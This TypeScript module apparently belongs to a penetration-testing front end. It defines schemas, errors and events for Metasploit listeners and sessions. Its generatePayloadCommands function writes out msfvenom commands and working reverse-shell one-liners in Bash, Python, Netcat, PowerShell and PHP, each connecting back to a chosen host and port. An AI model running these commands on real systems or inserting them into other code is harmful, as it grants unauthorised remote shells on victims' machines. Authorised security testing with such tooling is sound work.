import { Schema } from "effect";
import { makeEntityId, TrimmedNonEmptyString } from "./baseSchemas";

// ─── Branded IDs ────────────────────────────────────────────────────────────

export const ListenerId = makeEntityId("ListenerId");
export type ListenerId = typeof ListenerId.Type;

export const MsfSessionId = makeEntityId("MsfSessionId");
export type MsfSessionId = typeof MsfSessionId.Type;

// ─── Schemas ────────────────────────────────────────────────────────────────

const TerminalColsSchema = Schema.Int.check(Schema.isGreaterThanOrEqualTo(20)).check(
  Schema.isLessThanOrEqualTo(400),
);
const TerminalRowsSchema = Schema.Int.check(Schema.isGreaterThanOrEqualTo(5)).check(
  Schema.isLessThanOrEqualTo(200),
);

export const ListenerStatus = Schema.Literals([
  "starting",
  "waiting",
  "active",
  "stopped",
  "error",
]);
export type ListenerStatus = typeof ListenerStatus.Type;

export const MsfSessionStatus = Schema.Literals(["open", "upgrading", "closed"]);
export type MsfSessionStatus = typeof MsfSessionStatus.Type;

export const MsfSessionType = Schema.Literals(["shell", "meterpreter"]);
export type MsfSessionType = typeof MsfSessionType.Type;

export const PayloadType = Schema.Literals([
  "windows/meterpreter/reverse_tcp",
  "windows/x64/meterpreter/reverse_tcp",
  "windows/shell/reverse_tcp",
  "linux/x86/meterpreter/reverse_tcp",
  "linux/x86/shell/reverse_tcp",
  "linux/x64/meterpreter/reverse_tcp",
  "linux/x64/shell/reverse_tcp",
  "java/meterpreter/reverse_tcp",
  "php/meterpreter/reverse_tcp",
  "cmd/unix/reverse_bash",
  "generic/shell_reverse_tcp",
]);
export type PayloadType = typeof PayloadType.Type;

/** Payloads that produce a raw TCP reverse shell — can be handled by a direct TCP listener. */
const DIRECT_TCP_PAYLOADS: ReadonlySet<string> = new Set(["cmd/unix/reverse_bash"]);

/** Returns true if the payload can be served by a direct TCP listener (no msfrpcd needed). */
export function isDirectTcpPayload(payload: string): boolean {
  return DIRECT_TCP_PAYLOADS.has(payload);
}

// ─── Payload Command Generation ────────────────────────────────────────────

const PAYLOAD_FORMAT_MAP: Record<string, { ext: string; format: string }> = {
  "windows/meterpreter/reverse_tcp": { ext: "exe", format: "exe" },
  "windows/x64/meterpreter/reverse_tcp": { ext: "exe", format: "exe" },
  "windows/shell/reverse_tcp": { ext: "exe", format: "exe" },
  "linux/x86/meterpreter/reverse_tcp": { ext: "elf", format: "elf" },
  "linux/x86/shell/reverse_tcp": { ext: "elf", format: "elf" },
  "linux/x64/meterpreter/reverse_tcp": { ext: "elf", format: "elf" },
  "linux/x64/shell/reverse_tcp": { ext: "elf", format: "elf" },
  "java/meterpreter/reverse_tcp": { ext: "jar", format: "jar" },
  "php/meterpreter/reverse_tcp": { ext: "php", format: "raw" },
  "generic/shell_reverse_tcp": { ext: "elf", format: "elf" },
};

export interface PayloadCommand {
  label: string;
  command: string;
}

/**
 * Generate msfvenom command and common one-liners for a given payload configuration.
 */
export function generatePayloadCommands(
  payload: PayloadType,
  lhost: string,
  lport: number,
): PayloadCommand[] {
  const commands: PayloadCommand[] = [];
  const host = lhost === "0.0.0.0" ? "<YOUR_IP>" : lhost;

  // msfvenom command
  const fmt = PAYLOAD_FORMAT_MAP[payload];
  if (fmt) {
    commands.push({
      label: "msfvenom",
      command: `msfvenom -p ${payload} LHOST=${host} LPORT=${lport} -f ${fmt.format} -o payload.${fmt.ext}`,
    });
  }

  // Common one-liners
  if (payload === "cmd/unix/reverse_bash" || payload.startsWith("linux/")) {
    commands.push({
      label: "Bash reverse shell",
      command: `bash -i >& /dev/tcp/${host}/${lport} 0>&1`,
    });
    commands.push({
      label: "Python reverse shell",
      command: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${host}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    });
    commands.push({
      label: "Netcat reverse shell",
      command: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${lport} >/tmp/f`,
    });
  }

  if (payload.startsWith("windows/")) {
    commands.push({
      label: "PowerShell reverse shell",
      command: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${host}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    });
  }

  if (payload === "php/meterpreter/reverse_tcp") {
    commands.push({
      label: "PHP reverse shell",
      command: `php -r '$sock=fsockopen("${host}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    });
  }

  if (payload === "java/meterpreter/reverse_tcp") {
    commands.push({
      label: "Java reverse shell",
      command: `java -jar payload.jar`,
    });
  }

  return commands;
}

export const ListenerConfig = Schema.Struct({
  listenerId: TrimmedNonEmptyString,
  name: TrimmedNonEmptyString,
  payload: PayloadType,
  lhost: TrimmedNonEmptyString,
  lport: Schema.Int.check(Schema.isGreaterThanOrEqualTo(1)).check(
    Schema.isLessThanOrEqualTo(65535),
  ),
});
export type ListenerConfig = typeof ListenerConfig.Type;

export const ListenerSnapshot = Schema.Struct({
  listenerId: Schema.String.check(Schema.isNonEmpty()),
  name: Schema.String.check(Schema.isNonEmpty()),
  payload: PayloadType,
  lhost: Schema.String.check(Schema.isNonEmpty()),
  lport: Schema.Int,
  status: ListenerStatus,
  jobId: Schema.NullOr(Schema.String),
  createdAt: Schema.String,
});
export type ListenerSnapshot = typeof ListenerSnapshot.Type;

export const MsfSessionSnapshot = Schema.Struct({
  sessionId: Schema.String.check(Schema.isNonEmpty()),
  type: MsfSessionType,
  info: Schema.String,
  targetHost: Schema.String,
  platform: Schema.String,
  via: Schema.String,
  listenerId: Schema.NullOr(Schema.String),
  openedAt: Schema.String,
});
export type MsfSessionSnapshot = typeof MsfSessionSnapshot.Type;

// ─── Input Schemas ──────────────────────────────────────────────────────────

export const CreateListenerInput = Schema.Struct({
  name: TrimmedNonEmptyString,
  payload: PayloadType,
  lhost: TrimmedNonEmptyString,
  lport: Schema.Int.check(Schema.isGreaterThanOrEqualTo(1)).check(
    Schema.isLessThanOrEqualTo(65535),
  ),
});
export type CreateListenerInput = typeof CreateListenerInput.Type;

export const StopListenerInput = Schema.Struct({
  listenerId: TrimmedNonEmptyString,
});
export type StopListenerInput = typeof StopListenerInput.Type;

export const SessionWriteInput = Schema.Struct({
  sessionId: TrimmedNonEmptyString,
  data: Schema.String.check(Schema.isNonEmpty()).check(Schema.isMaxLength(65_536)),
});
export type SessionWriteInput = typeof SessionWriteInput.Type;

export const SessionResizeInput = Schema.Struct({
  sessionId: TrimmedNonEmptyString,
  cols: TerminalColsSchema,
  rows: TerminalRowsSchema,
});
export type SessionResizeInput = typeof SessionResizeInput.Type;

export const SessionUpgradeInput = Schema.Struct({
  sessionId: TrimmedNonEmptyString,
});
export type SessionUpgradeInput = typeof SessionUpgradeInput.Type;

export const SessionCloseInput = Schema.Struct({
  sessionId: TrimmedNonEmptyString,
});
export type SessionCloseInput = typeof SessionCloseInput.Type;

export const SessionAttachInput = Schema.Struct({
  sessionId: TrimmedNonEmptyString,
  /** Initial terminal columns — used for PTY upgrade stty sizing. */
  cols: Schema.optionalKey(Schema.Int),
  /** Initial terminal rows — used for PTY upgrade stty sizing. */
  rows: Schema.optionalKey(Schema.Int),
});
export type SessionAttachInput = typeof SessionAttachInput.Type;

export const SessionAttachOutput = Schema.Struct({
  sessionId: Schema.String.check(Schema.isNonEmpty()),
  attached: Schema.Boolean,
});
export type SessionAttachOutput = typeof SessionAttachOutput.Type;

export const SessionDetachInput = Schema.Struct({
  sessionId: TrimmedNonEmptyString,
});
export type SessionDetachInput = typeof SessionDetachInput.Type;

export const MetasploitStatusSnapshot = Schema.Struct({
  connected: Schema.Boolean,
  version: Schema.NullOr(Schema.String),
  listenersCount: Schema.Int,
  sessionsCount: Schema.Int,
});
export type MetasploitStatusSnapshot = typeof MetasploitStatusSnapshot.Type;

// ─── Errors ─────────────────────────────────────────────────────────────────

export class MetasploitConnectionError extends Schema.TaggedErrorClass<MetasploitConnectionError>()(
  "MetasploitConnectionError",
  {
    message: Schema.String,
    cause: Schema.optional(Schema.Defect),
  },
) {}

export class MetasploitListenerError extends Schema.TaggedErrorClass<MetasploitListenerError>()(
  "MetasploitListenerError",
  {
    listenerId: Schema.optional(Schema.String),
    message: Schema.String,
    cause: Schema.optional(Schema.Defect),
  },
) {}

export class MetasploitSessionError extends Schema.TaggedErrorClass<MetasploitSessionError>()(
  "MetasploitSessionError",
  {
    sessionId: Schema.optional(Schema.String),
    message: Schema.String,
    cause: Schema.optional(Schema.Defect),
  },
) {}

export class MetasploitNotFoundError extends Schema.TaggedErrorClass<MetasploitNotFoundError>()(
  "MetasploitNotFoundError",
  {
    message: Schema.String,
    cause: Schema.optional(Schema.Defect),
  },
) {
  static readonly default = () =>
    new MetasploitNotFoundError({
      message:
        "msfrpcd binary not found on $PATH. Install Metasploit Framework or ensure it is in your $PATH",
    });
}

export class MetasploitListenerLookupError extends Schema.TaggedErrorClass<MetasploitListenerLookupError>()(
  "MetasploitListenerLookupError",
  {
    sessionId: Schema.optional(Schema.String),
    listenerId: Schema.optional(Schema.String),
    message: Schema.String,
    cause: Schema.optional(Schema.Defect),
  },
) {}

export const MetasploitError = Schema.Union([
  MetasploitConnectionError,
  MetasploitListenerError,
  MetasploitSessionError,
  MetasploitNotFoundError,
  MetasploitListenerLookupError,
]);
export type MetasploitError = typeof MetasploitError.Type;

// ─── Events ─────────────────────────────────────────────────────────────────

const MetasploitEventBaseSchema = Schema.Struct({
  createdAt: Schema.String,
});

const ListenerCreatedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("listener.created"),
  snapshot: ListenerSnapshot,
});

const ListenerStoppedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("listener.stopped"),
  listenerId: Schema.String.check(Schema.isNonEmpty()),
});

const SessionOpenedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("session.opened"),
  snapshot: MsfSessionSnapshot,
});

const SessionClosedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("session.closed"),
  sessionId: Schema.String.check(Schema.isNonEmpty()),
});

const SessionOutputEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("session.output"),
  sessionId: Schema.String.check(Schema.isNonEmpty()),
  data: Schema.String,
});

const SessionUpgradedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("session.upgraded"),
  previousSessionId: Schema.optional(Schema.NonEmptyString),
  snapshot: MsfSessionSnapshot,
});

const ListenerUpdatedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("listener.updated"),
  snapshot: ListenerSnapshot,
});

const ConnectionChangedEvent = Schema.Struct({
  ...MetasploitEventBaseSchema.fields,
  type: Schema.Literal("connection.changed"),
  connected: Schema.Boolean,
  version: Schema.optional(Schema.String),
});

export const MetasploitEvent = Schema.Union([
  ListenerCreatedEvent,
  ListenerStoppedEvent,
  ListenerUpdatedEvent,
  SessionOpenedEvent,
  SessionClosedEvent,
  SessionOutputEvent,
  SessionUpgradedEvent,
  ConnectionChangedEvent,
]);
export type MetasploitEvent = typeof MetasploitEvent.Type;
